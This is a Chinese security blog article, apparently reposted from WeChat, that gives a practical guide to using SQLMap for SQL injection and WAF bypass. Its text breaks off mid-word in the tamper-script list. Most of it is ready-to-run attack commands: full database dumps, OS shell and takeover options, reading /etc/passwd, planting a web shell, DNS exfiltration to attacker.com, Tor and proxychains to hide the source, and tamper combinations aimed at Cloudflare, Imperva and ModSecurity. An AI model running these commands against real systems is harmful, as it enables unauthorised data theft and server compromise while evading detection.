---
title: 精通SQLMap和Ghauri：WAF绕过技术实用指南
url: https://mp.weixin.qq.com/s/sSqz-teZ-NUVTr7Tv8IPsQ
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:40:58.822714
---

# 精通SQLMap和Ghauri：WAF绕过技术实用指南

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jmiaoSVG05RzJDBGOcdBIyNicbfuYt2MJFtcaZTibAxRicDkdrP6jn5xZSCuhIRicWVh3xTrUBBRZeveZA/0?wx_fmt=jpeg)

# 精通SQLMap和Ghauri：WAF绕过技术实用指南

原创

骨哥说事
骨哥说事

骨哥说事

![]()

在小说阅读器中沉浸阅读

|  |
| --- |
|  |

#

#

#

**↓**

#

|  |
| --- |
| ****声明：****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 |

#

#

# **防走失：****https://gugesay.com/**

**不想错过任何消息？设置星标****↓ ↓ ↓**

#

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg)

**SQL注入（SQLi）** 即使在2026年，仍然是影响力最大的Web应用程序漏洞之一。虽然WAF（Web应用防火墙）、ORM（对象关系映射）和安全编码框架有所改进，但真实世界的应用程序仍然会通过遗留代码、配置不当的API和复杂的后端逻辑暴露出注入点。为了应对现代目标和强大的防御，安全研究人员通常会使用一些自动化工具，例如 **SQLmap** 和 **Ghauri**。两者都旨在自动化完整的SQL注入工作流程，从检测到利用，但它们在内部设计、性能和规避策略上有显著差异。

在本文中，将为你展示如何在实践中使用这两种工具，涵盖高级枚举、WAF绕过技术以及现代渗透测试的自动化工作流。

### SQLmap：行业标准

SQLmap 是一款自动化检测和利用SQL注入漏洞的开源工具，从发现到完全的数据库接管。它被广泛认为是同类工具中最强大的，深受安全研究者和渗透测试社区的信任。

#### 核心优势：

* 广泛的数据库管理系统支持（MySQL、Oracle、PostgreSQL、MSSQL等）。
* 支持所有六种SQL注入技术：基于布尔的盲注、基于错误的注入、联合查询注入、堆叠查询、基于时间的盲注和带外注入。
* 高级功能如文件系统访问、操作系统命令执行和注册表访问。
* 高度可配置，支持**篡改脚本**。

**注意：** 你可以使用 `-hh` 标志查看所有可用选项和完整的命令用法。以下仅列出在实际测试中最常依赖且最有用的命令。

#### 基本命令概览

SQLmap 使用模块化的命令结构。以下是最常见的操作：

#### 基本目标扫描

对单个GET参数进行初步SQL注入测试并枚举可用数据库。

```
sqlmap -u "vulnerable_url" --dbs --batch
```

#### 通过请求文件测试（最适合POST/Headers）

使用从Burp等工具捕获的原始HTTP请求来测试POST正文、请求头、Cookie、JSON和复杂的API请求。

```
sqlmap -r request.txt --level 5 --risk 3 --batch --dbs
```

#### Dorking 方式

直接从搜索引擎搜索易受攻击的URL并自动测试它们。

```
sqlmap -g 'site:target.com inurl:\".php?id=1\"'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jmiaoSVG05RzJDBGOcdBIyNiczunN2OiciaxqcAEsHgG2kmyKCZ8kanMRKb05WQe3sr6TLN58UsORsTFQ/640?wx_fmt=png&from=appmsg)

#### 使用批量URL扫描

在一个自动化运行中扫描文本文件中列出的多个目标URL，这样你就不必手动逐个测试每个目标。

```
http://testphp.vulnweb.com/search.php?limit=100
http://testphp.vulnweb.com/search.php?order=order&query=query
http://testphp.vulnweb.com/search?q=aaa
http://testphp.vulnweb.com/showimage.php?file=aa
sqlmap -m urls.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs
```

#### Tor模式

通过Tor网络路由所有流量，以隐藏你的真实IP并规避基于IP的阻止或速率限制。

```
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --dbs --batch
```

#### Burp模式

将所有SQLmap流量通过Burp Suite发送，以便进行检查、手动篡改和分析WAF行为。

```
sqlmap -r request.txt --level 3 --risk 2 --random-agent --time-sec=30  --proxy https://127.0.0.1:8080 --thread=10 --dbs --hostname --current-user --current-db
```

#### JSON 类型 SQL 注入

检测JSON请求正文中的SQL注入，使用十六进制编码的载荷，并在API网关返回403 Forbidden响应时继续测试。

```
sqlmap -u 'vulnerable_url' --data '{"User":"admin","Pwd":"admin@123"}' --random-agent --ignore-code 403 --dbs --hex
```

#### 数据库枚举

这些选项让你系统地探索数据库结构，从列出数据库到提取特定的表、列和数据。

```
--dbs                                      # 列出目标上所有可用的数据库。
-D database_name --tables                  # 列出指定数据库内的所有表。
-D database_name -T table_name --columns   # 列出指定表内的所有列。
-D database_name -T table_name -C col1,col2 --dump  # 仅转储表中选定的列。
```

#### 高级数据提取

这些选项有助于在转储过程中高效地提取大量数据，同时避开常见的过滤和编码问题。

```
--dump-all     # 一次性转储所有数据库、表和数据。
--threads=10   # 使用10个并行线程来加速攻击。
--hex          # 以十六进制编码检索到的数据，以绕过过滤器并避免编码问题。
--no-cast      # 禁用数据类型转换，防止在提取过程中发生数据库转换错误。
```

#### 认证与会话处理

这些选项允许SQLmap处理认证会话、自定义请求头以及受CSRF保护的表单，同时降低被检测的风险。

```
--cookie="PHPSESSID=..."               # 发送会话Cookie以保持认证状态。
--headers="X-Forwarded-For: 127.0.0.1"# 添加自定义HTTP请求头（可用于欺骗IP或绕过WAF规则）。
--csrf-token=token                     # 通过提取并重用令牌来处理受CSRF保护的表单。
--random-agent                         # 每次请求时随机化User-Agent以避免检测。
```

#### 操作系统与文件系统访问

这些选项展示了SQL注入如何用于后渗透利用，允许在底层服务器上进行文件访问，并在某些情况下执行命令。

```
--os-shell                              # 尝试在目标操作系统上打开一个交互式命令外壳。
--os-pwn                                # 尝试使用高级利用方法进行完整的系统接管。
--file-read=/etc/passwd                 # 从目标服务器读取文件。
--file-write=shell.php --file-dest=/var/www/html/shell.php  # 将本地文件上传到服务器上的特定路径。
```

#### 带外与DNS数据渗出

当带内响应不可用时，这些选项使用外部通道（如DNS或HTTP）来确认和提取盲注SQL注入的数据。

```
--dns-domain=attacker.com   # 使用自定义DNS域进行带外数据渗出和盲注SQLi检测。
--os-shell --technique=O    # 尝试仅使用带外（DNS/HTTP）注入技术来获取操作系统命令外壳。
```

#### Header 滥用

这些选项操作HTTP请求头、请求方法和参数格式，以绕过代理、WAF规则或不寻常的请求处理逻辑。

```
--headers="X-Original-URL: /vuln.php"  # 发送自定义请求头，常用于绕过反向代理或WAF路由规则。
--method=PUT                           # 强制将HTTP请求方法改为PUT而不是GET/POST。
--param-del=";"                        # 当目标使用“;”分隔参数时，设置自定义参数分隔符。
```

####

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jmiaoSVG05RzJDBGOcdBIyNicTqIss2gpJZkM34uhfNYR3WtS3oNmyNFicpIldQ5HguCNTDKQVlKI3DQ/640?wx_fmt=png&from=appmsg)

#### 时间与速率规避

这些选项减缓请求速度并减少噪声，帮助SQLmap避免速率限制和基于行为的检测，同时保持可靠性。

```
--delay=5      # 每次请求之间等待3秒以保持隐蔽。
--timeout=20   # 将20秒设置为服务器响应的最大等待时间。
--retries=5    # 最多重试5次失败的请求。
--threads=1    # 使用单个线程进行缓慢、低噪声的扫描。
```

#### 表单中的 SQL 注入

此方法使用SQLmap自动查找并测试表单输入是否存在SQL注入，通过爬取页面并分析所有检测到的字段实现。

```
sqlmap -u https://target.com/registration --dbs --forms --crawl=2 --batch
```

### SQLmap WAF绕过与规避技术

现代WAF（如Cloudflare、Akamai等）分析请求模式和载荷行为，而不仅仅是特定的关键词。为了规避这些检测，篡改脚本被用来在发送前动态修改SQL载荷，改变其结构、编码和语法以绕过过滤规则。

你可以在下表中找到所有篡改脚本的用法详情，该表包含 **SQLmap默认篡改脚本** 的完整信息，包括其要求、测试环境备注和示例Payload注入。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jmiaoSVG05RzJDBGOcdBIyNiciaa3qiadLTbOWibNvMyd9WQII9pyT3y6AzY1lHqYjSOEO8wcvcQXicRmiaA/640?wx_fmt=png&from=appmsg)

#### SQLmap篡改脚本官方仓库：

https://github.com/coffinxp/payloads/blob/main/Sqlmap%20Tamper%20Scripts%20cheatSheet.ods[1]

SQLmap Tamper Scripts 官方仓库

#### 忽略被阻止的HTTP状态码

忽略被阻止的HTTP状态码。如果WAF返回403或500，请配置SQLmap忽略这些状态码并继续测试。

```
sqlmap -r request.txt --level=5 --risk=3 --no-cast --force-ssl --ignore-code=500 --dbs
```

#### Imperva / Incapsula WAF 绕过

```
sqlmap -u 'vulnerable_url' --risk 3 --level 5 --dbs --tamper=space2comment,space2morehash
```

#### ModSecurity WAF 绕过

使用如下所示的篡改脚本配合随机User-Agent、延迟和编码，以破坏正则表达式模式并使载荷绕过ModSecurity过滤器。

```
proxychains sqlmap -u 'vulnerable_url' --random-agent --batch --dbs --level 3 --tamper=between,space2comment --hex --delay 5
sqlmap -u 'vulnerable_url' --dbs --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --batch --level 3
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jmiaoSVG05RzJDBGOcdBIyNicdmmTiaQCiaBJ9v22yjpmLgBjfSVXVNelMw7fDvrltELHbWrVWLGnu0pw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jmiaoSVG05RzJDBGOcdBIyNicVzydgoHTndyTLffpF0YtvzgkBw1Sp7jp9IkwW9uNJ5t6KRXEZZg4IA/640?wx_fmt=png&from=appmsg)

#### Cloudflare WAF 绕过

通过使用随机大小写、编码和内联注释篡改来破坏关键词模式，从而规避Cloudflare的签名检查。

```
sqlmap -u 'vulnerable_url' --batch --dbs --threads=5 --random-agent --risk=3 --level=5 --tamper=space2comment -v 3 --dbms=MySQL
sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash
sqlmap -u "vulnerable_url" --tamper=space2comment,randomcase,charencode --level 5 --risk 3 --batch --dbs
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jmiaoSVG05RzJDBGOcdBIyNiczrMTFU5vfI52HlyLUDrJxa8Ycl6M3llvP0iaQsosQvyBs5a7dwAcAVA/640?wx_fmt=png&from=appmsg)

```
proxychains sqlmap -u 'vulnerable_url' --dbs --batch -p id --random-agent --tamper=between,space2comment --dbms mysql --tech=B --no-cast  --flush-session --threads 10
```

```

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jmiaoSVG05RzJDBGOcdBIyNicjDKjhf3q61P44xq0gMkCzVWuOBIz9ebMZ7pkLwQoKKWUFN6EIYy5gw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jmiaoSVG05RzJDBGOcdBIyNicwsfEOhcXHiabS00mRUd6nOszcwom1XJOzHykRH2g7cuoRicbBDFpK8Jw/640?wx_fmt=png&from=appmsg)

> 📝 **注意：不要同时使用过多的篡改脚本。这会使载荷变得非常冗长，从而触发WAF拦截，导致冲突、误报，并减慢扫描速度。只使用必要的脚本，并且一次不要超过3个。**

#### SQLmap WAF绕过技巧（对笔者每次都生效）

* 使用 `--tamper` 时，使用一个或多个脚本（用逗号分隔）来混淆载荷并规避基于签名的规则。一些常用且有效的脚本组合包括：

```
--tamper=between,randomcase,space2comment                 # 适用于：ModSecurity, Cloudflare, F5 ASM
--tamper=space2comment,space2morehash                     # 适用于：ModSecurity, Imperva SecureSphere
--tamper=modsecurityversioned,space2comment               # 适用于：ModSecurity, Comodo WAF
--tamper=space2comment,betwee...